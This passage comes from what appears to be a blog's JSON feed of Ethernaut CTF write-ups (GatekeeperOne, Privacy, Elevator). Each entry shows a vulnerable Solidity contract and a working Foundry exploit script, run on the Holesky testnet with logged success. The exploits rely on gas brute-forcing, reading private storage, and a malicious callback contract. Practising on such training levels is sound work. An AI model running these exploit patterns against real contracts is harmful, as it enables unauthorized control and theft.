class=\"kt\">uint16</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"n\">_gateKey</span><span class=\"p\">)),</span> <span class=\"s\">\"GatekeeperOne: invalid gateThree part one\"</span><span class=\"p\">);</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"kt\">uint32</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"n\">_gateKey</span><span class=\"p\">))</span> <span class=\"o\">!=</span> <span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"n\">_gateKey</span><span class=\"p\">),</span> <span class=\"s\">\"GatekeeperOne: invalid gateThree part two\"</span><span class=\"p\">);</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"kt\">uint32</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"n\">_gateKey</span><span class=\"p\">))</span> <span class=\"o\">==</span> <span class=\"kt\">uint16</span><span class=\"p\">(</span><span class=\"kt\">uint160</span><span class=\"p\">(</span><span class=\"n\">tx</span><span class=\"p\">.</span><span class=\"n\">origin</span><span class=\"p\">)),</span> <span class=\"s\">\"GatekeeperOne: invalid gateThree part three\"</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">enter</span><span class=\"p\">(</span><span class=\"kt\">bytes8</span> <span class=\"n\">_gateKey</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">gateOne</span> <span class=\"n\">gateTwo</span> <span class=\"n\">gateThree</span><span class=\"p\">(</span><span class=\"n\">_gateKey</span><span class=\"p\">)</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">entrant</span> <span class=\"o\">=</span> <span class=\"n\">tx</span><span class=\"p\">.</span><span class=\"n\">origin</span><span class=\"p\">;</span>        <span class=\"k\">return</span> <span class=\"nb\">true</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p><a href=\"https://docs.soliditylang.org/en/latest/units-and-global-variables.html\">Solidity 0.8.30 Documentation - units and global variables</a></p><blockquote>  <p>üí° <code class=\"language-plaintext highlighter-rouge\">gasleft()¬†returns¬†(uint256)</code>: remaining gas</p></blockquote><p><a href=\"https://docs.soliditylang.org/en/latest/control-structures.html#external-function-calls\">Solidity 0.8.30 Documentation - external function calls</a></p><blockquote>  <p>üí° When calling functions of other contracts, you can specify the amount of Wei or gas sent with the call with the special options¬†<code class=\"language-plaintext highlighter-rouge\">{value:¬†10,¬†gas:¬†10000}</code>. Note that it is discouraged to specify gas values explicitly, since the gas costs of opcodes can change in the future.</p></blockquote><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/GateKeeperOne.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">ex</span><span class=\"p\">(</span><span class=\"n\">GatekeeperOne</span> <span class=\"n\">gko_</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint</span><span class=\"p\">){</span>        <span class=\"kt\">bytes8</span> <span class=\"n\">gateKey</span> <span class=\"o\">=</span> <span class=\"kt\">bytes8</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"kt\">uint160</span><span class=\"p\">(</span><span class=\"n\">tx</span><span class=\"p\">.</span><span class=\"n\">origin</span><span class=\"p\">)))</span> <span class=\"o\">&amp;</span> <span class=\"mh\">0xFFFFFFFF0000FFFF</span><span class=\"p\">;</span>        <span class=\"k\">for</span><span class=\"p\">(</span><span class=\"kt\">uint</span> <span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"n\">i</span><span class=\"o\">&lt;=</span><span class=\"mi\">350</span><span class=\"p\">;</span> <span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"p\">(</span><span class=\"kt\">bool</span> <span class=\"n\">result</span><span class=\"p\">,)</span> <span class=\"o\">=</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">gko_</span><span class=\"p\">).</span><span class=\"nb\">call</span><span class=\"p\">{</span><span class=\"n\">gas</span><span class=\"o\">:</span> <span class=\"n\">i</span><span class=\"o\">+</span><span class=\"p\">(</span><span class=\"mi\">8191</span><span class=\"o\">*</span><span class=\"mi\">3</span><span class=\"p\">)}(</span><span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encodeWithSignature</span><span class=\"p\">(</span><span class=\"s\">\"enter(bytes8)\"</span><span class=\"p\">,</span> <span class=\"n\">gateKey</span><span class=\"p\">));</span>            <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"n\">result</span><span class=\"p\">)</span> <span class=\"p\">{</span>                <span class=\"k\">return</span> <span class=\"n\">i</span><span class=\"p\">;</span>            <span class=\"p\">}</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">GateKeeperOneSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">GatekeeperOne</span> <span class=\"k\">public</span> <span class=\"n\">gko_</span> <span class=\"o\">=</span> <span class=\"n\">GatekeeperOne</span><span class=\"p\">(</span><span class=\"mh\">0x8905857EFf6E619C391C6a828B62F86f2D15CCf8</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>            <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before entrant: \"</span><span class=\"p\">,</span> <span class=\"n\">gko_</span><span class=\"p\">.</span><span class=\"n\">entrant</span><span class=\"p\">());</span>        <span class=\"n\">Ex</span> <span class=\"n\">ex</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"gas: \"</span><span class=\"p\">,</span> <span class=\"n\">ex</span><span class=\"p\">.</span><span class=\"n\">ex</span><span class=\"p\">(</span><span class=\"n\">gko_</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After entrant: \"</span><span class=\"p\">,</span> <span class=\"n\">gko_</span><span class=\"p\">.</span><span class=\"n\">entrant</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/GateKeeperOneSol.sol <span class=\"nt\">--tc</span> GateKeeperOneSol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Before entrant:  0x0000000000000000000000000000000000000000  gas:  256  After entrant:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001016731 gweiEstimated total gas used <span class=\"k\">for </span>script: 987058Estimated amount required: 0.000001003572467398 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x4a586d22227da1b4e2ea917dace32511f929924c727de6b803583281190d3fc7Block: 3700680Paid: 0.000000434849804628 ETH <span class=\"o\">(</span>427697 gas <span class=\"k\">*</span> 0.001016724 gwei<span class=\"o\">)</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xfb2ec0646fe566660746a9b0d4bee577abc05e255f4e08aec3dfd7368faaf944Contract Address: 0xBD597a280DC80c5f4D76A6Ccf23FAA6b00f721e3Block: 3700680Paid: 0.000000282768228708 ETH <span class=\"o\">(</span>278117 gas <span class=\"k\">*</span> 0.001016724 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000717618033336 ETH (705814 gas * avg 0.001016724 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-22-GateKeeper-One/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/22/gatekeeper-one",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-22T00:00:00+09:00",
            "date_modified": "2025-04-22T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/21/privacy",
            "title": "[Ethernaut] Privacy",
            "summary": null,
            "content_text": "AnalysisThe goal is  Unlock this contract// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Privacy {    bool public locked = true;    uint256 public ID = block.timestamp;    uint8 private flattening = 10;    uint8 private denomination = 255;    uint16 private awkwardness = uint16(block.timestamp);    bytes32[3] private data;    constructor(bytes32[3] memory _data) {        data = _data;    }    function unlock(bytes16 _key) public {        require(_key == bytes16(data[2]));        locked = false;    }    /*    A bunch of super advanced solidity algorithms...      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\\      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU    */}Exploit$ cast storage 0x5f53F41e151eC3Aa4940aE7e72793Dfb146FBaBf 50x2e6dd7c443546475a82933c495244f04552f561cf503e9eb2ff70cf9a9dae79e// SPDX-License-Ideifier: MITpragma solidity ^0.8.0;import \"../src/Privacy.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract PrivacySol is Script {    Privacy public privacy_ = Privacy(0x5f53F41e151eC3Aa4940aE7e72793Dfb146FBaBf);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        bytes32 key = 0x2e6dd7c443546475a82933c495244f04552f561cf503e9eb2ff70cf9a9dae79e;        console.log(\"Befor locked: \", privacy_.locked());        privacy_.unlock(bytes16(key));        console.log(\"After locked: \", privacy_.locked());        vm.stopBroadcast();    }}$ forge script script/PrivacySol.sol --broadcast[‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  Befor locked:  true  After locked:  false## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.003570664 gweiEstimated total gas used for script: 35136Estimated amount required: 0.000000125458850304 ETH==========================##### holesky‚úÖ  [Success] Hash: 0x500bbd111079c706073537e8181bdedf1346c81df182edf586f32e554fc1edfdBlock: 3693787Paid: 0.0000000857850104 ETH (24025 gas * 0.003570656 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.0000000857850104 ETH (24025 gas * avg 0.003570656 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>Unlock this contract</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Privacy</span> <span class=\"p\">{</span>    <span class=\"kt\">bool</span> <span class=\"k\">public</span> <span class=\"n\">locked</span> <span class=\"o\">=</span> <span class=\"nb\">true</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">ID</span> <span class=\"o\">=</span> <span class=\"n\">block</span><span class=\"p\">.</span><span class=\"n\">timestamp</span><span class=\"p\">;</span>    <span class=\"kt\">uint8</span> <span class=\"k\">private</span> <span class=\"n\">flattening</span> <span class=\"o\">=</span> <span class=\"mi\">10</span><span class=\"p\">;</span>    <span class=\"kt\">uint8</span> <span class=\"k\">private</span> <span class=\"n\">denomination</span> <span class=\"o\">=</span> <span class=\"mi\">255</span><span class=\"p\">;</span>    <span class=\"kt\">uint16</span> <span class=\"k\">private</span> <span class=\"n\">awkwardness</span> <span class=\"o\">=</span> <span class=\"kt\">uint16</span><span class=\"p\">(</span><span class=\"n\">block</span><span class=\"p\">.</span><span class=\"n\">timestamp</span><span class=\"p\">);</span>    <span class=\"kt\">bytes32</span><span class=\"p\">[</span><span class=\"mi\">3</span><span class=\"p\">]</span> <span class=\"k\">private</span> <span class=\"n\">data</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">bytes32</span><span class=\"p\">[</span><span class=\"mi\">3</span><span class=\"p\">]</span> <span class=\"k\">memory</span> <span class=\"n\">_data</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">data</span> <span class=\"o\">=</span> <span class=\"n\">_data</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">unlock</span><span class=\"p\">(</span><span class=\"kt\">bytes16</span> <span class=\"n\">_key</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">_key</span> <span class=\"o\">==</span> <span class=\"kt\">bytes16</span><span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">[</span><span class=\"mi\">2</span><span class=\"p\">]));</span>        <span class=\"n\">locked</span> <span class=\"o\">=</span> <span class=\"nb\">false</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"cm\">/*    A bunch of super advanced solidity algorithms...      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\\      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU    */</span><span class=\"p\">}</span></code></pre></div></div><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>cast storage 0x5f53F41e151eC3Aa4940aE7e72793Dfb146FBaBf 50x2e6dd7c443546475a82933c495244f04552f561cf503e9eb2ff70cf9a9dae79e</code></pre></div></div><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Ideifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Privacy.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">PrivacySol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Privacy</span> <span class=\"k\">public</span> <span class=\"n\">privacy_</span> <span class=\"o\">=</span> <span class=\"n\">Privacy</span><span class=\"p\">(</span><span class=\"mh\">0x5f53F41e151eC3Aa4940aE7e72793Dfb146FBaBf</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"kt\">bytes32</span> <span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"mh\">0x2e6dd7c443546475a82933c495244f04552f561cf503e9eb2ff70cf9a9dae79e</span><span class=\"p\">;</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Befor locked: \"</span><span class=\"p\">,</span> <span class=\"n\">privacy_</span><span class=\"p\">.</span><span class=\"n\">locked</span><span class=\"p\">());</span>        <span class=\"n\">privacy_</span><span class=\"p\">.</span><span class=\"n\">unlock</span><span class=\"p\">(</span><span class=\"kt\">bytes16</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After locked: \"</span><span class=\"p\">,</span> <span class=\"n\">privacy_</span><span class=\"p\">.</span><span class=\"n\">locked</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/PrivacySol.sol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Befor locked:  <span class=\"nb\">true  </span>After locked:  <span class=\"nb\">false</span><span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.003570664 gweiEstimated total gas used <span class=\"k\">for </span>script: 35136Estimated amount required: 0.000000125458850304 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x500bbd111079c706073537e8181bdedf1346c81df182edf586f32e554fc1edfdBlock: 3693787Paid: 0.0000000857850104 ETH <span class=\"o\">(</span>24025 gas <span class=\"k\">*</span> 0.003570656 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.0000000857850104 ETH (24025 gas * avg 0.003570656 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-21-Privacy/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/21/privacy",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-21T00:00:00+09:00",
            "date_modified": "2025-04-21T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/21/elevator",
            "title": "[Ethernaut] Elevator",
            "summary": null,
            "content_text": "AnalysisThe goal is  reach the top of  building.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface Building {    function isLastFloor(uint256) external returns (bool);}contract Elevator {    bool public top;    uint256 public floor;    function goTo(uint256 _floor) public {        Building building = Building(msg.sender);        if (!building.isLastFloor(_floor)) {            floor = _floor;            top = building.isLastFloor(floor);        }    }}In goTo()  function, Building contract address set msg.sender .If the address of my contract is set the Building contract, then my contract will be able to control the state of the Elevator contract.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Elevator.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    bool public top = true;    function ex(Elevator elevator_) public {        elevator_.goTo(1);    }    function isLastFloor(uint256 _floor) public returns (bool) {        top = !top;        return top;    }}contract ElevatorSol is Script {    Elevator public elevator_ = Elevator(0xB7C9bDDeFd874195342CfCC46B6616dEE43B333c);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        console.log(\"Before floor: \", elevator_.floor());        console.log(\"Before top: \", elevator_.top());        Ex ex = new Ex();        ex.ex(elevator_);        console.log(\"After floor: \", elevator_.floor());        console.log(\"After top: \", elevator_.top());        vm.stopBroadcast();    }}$ forge script script/ElevatorSol.sol --tc ElevatorSol --broadcast[‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  Before floor:  0  Before top:  false  After floor:  1  After top:  true## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.012500004 gweiEstimated total gas used for script: 426394Estimated amount required: 0.000005329926705576 ETH==========================##### holesky‚úÖ  [Success] Hash: 0x383dbadbac63394500cd74036b4db823339e68086e37cae785aa356474f585b7Contract Address: 0xde8D8FEa9ca4bb8B509d26c3319D10DDd45971cCBlock: 3692540Paid: 0.000003109736504884 ETH (248779 gas * 0.012499996 gwei)##### holesky‚úÖ  [Success] Hash: 0x5deb7fb5644782b5570fa9181440860133684e910a08fe4525b5907ba5bf4c84Block: 3692540Paid: 0.000000931974701768 ETH (74558 gas * 0.012499996 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000004041711206652 ETH (323337 gas * avg 0.012499996 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>reach the top of  building.</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">interface</span> <span class=\"n\">Building</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">isLastFloor</span><span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">);</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">Elevator</span> <span class=\"p\">{</span>    <span class=\"kt\">bool</span> <span class=\"k\">public</span> <span class=\"n\">top</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">floor</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">goTo</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">_floor</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">Building</span> <span class=\"n\">building</span> <span class=\"o\">=</span> <span class=\"n\">Building</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">);</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"n\">building</span><span class=\"p\">.</span><span class=\"n\">isLastFloor</span><span class=\"p\">(</span><span class=\"n\">_floor</span><span class=\"p\">))</span> <span class=\"p\">{</span>            <span class=\"n\">floor</span> <span class=\"o\">=</span> <span class=\"n\">_floor</span><span class=\"p\">;</span>            <span class=\"n\">top</span> <span class=\"o\">=</span> <span class=\"n\">building</span><span class=\"p\">.</span><span class=\"n\">isLastFloor</span><span class=\"p\">(</span><span class=\"n\">floor</span><span class=\"p\">);</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>In <code class=\"language-plaintext highlighter-rouge\">goTo()</code>  function, Building contract address set <code class=\"language-plaintext highlighter-rouge\">msg.sender</code> .</p><p>If the address of my contract is set the Building contract, then my contract will be able to control the state of the Elevator contract.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Elevator.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"kt\">bool</span> <span class=\"k\">public</span> <span class=\"n\">top</span> <span class=\"o\">=</span> <span class=\"nb\">true</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">ex</span><span class=\"p\">(</span><span class=\"n\">Elevator</span> <span class=\"n\">elevator_</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">elevator_</span><span class=\"p\">.</span><span class=\"n\">goTo</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">isLastFloor</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">_floor</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">top</span> <span class=\"o\">=</span> <span class=\"o\">!</span><span class=\"n\">top</span><span class=\"p\">;</span>        <span class=\"k\">return</span> <span class=\"n\">top</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">ElevatorSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Elevator</span> <span class=\"k\">public</span> <span class=\"n\">elevator_</span> <span class=\"o\">=</span> <span class=\"n\">Elevator</span><span class=\"p\">(</span><span class=\"mh\">0xB7C9bDDeFd874195342CfCC46B6616dEE43B333c</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before floor: \"</span><span class=\"p\">,</span> <span class=\"n\">elevator_</span><span class=\"p\">.</span><span class=\"n\">floor</span><span class=\"p\">());</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before top: \"</span><span class=\"p\">,</span> <span class=\"n\">elevator_</span><span class=\"p\">.</span><span class=\"n\">top</span><span class=\"p\">());</span>        <span class=\"n\">Ex</span> <span class=\"n\">ex</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">();</span>        <span class=\"n\">ex</span><span class=\"p\">.</span><span class=\"n\">ex</span><span class=\"p\">(</span><span class=\"n\">elevator_</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After floor: \"</span><span class=\"p\">,</span> <span class=\"n\">elevator_</span><span class=\"p\">.</span><span class=\"n\">floor</span><span class=\"p\">());</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After top: \"</span><span class=\"p\">,</span> <span class=\"n\">elevator_</span><span class=\"p\">.</span><span class=\"n\">top</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div 